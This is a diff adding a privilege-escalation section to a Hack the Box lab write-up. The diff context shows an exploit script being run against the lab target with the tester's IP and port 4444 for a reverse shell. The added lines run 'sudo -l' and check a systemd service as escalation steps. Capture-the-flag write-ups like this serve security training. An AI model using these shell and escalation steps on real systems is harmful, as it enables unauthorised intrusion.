@@ -55,3 +55,14 @@ python3 51676.py 10.10.14.4 4444 http://10.10.11.224:55555/nmsxly
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d1f9fe95-40a3-4694-a9ef-ebf126e09f4f)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3dde2cda-02a1-4206-92ef-1ee52146c66d)
+
+Privilege Escalation
+```CSS
+sudo -l
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d5572bae-5d90-44bc-94bf-05e1dde27be4)
+
+```CSS
+sudo systemctl status trail.service
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d787cd01-cd77-43ca-834e-42ba5f899c29)
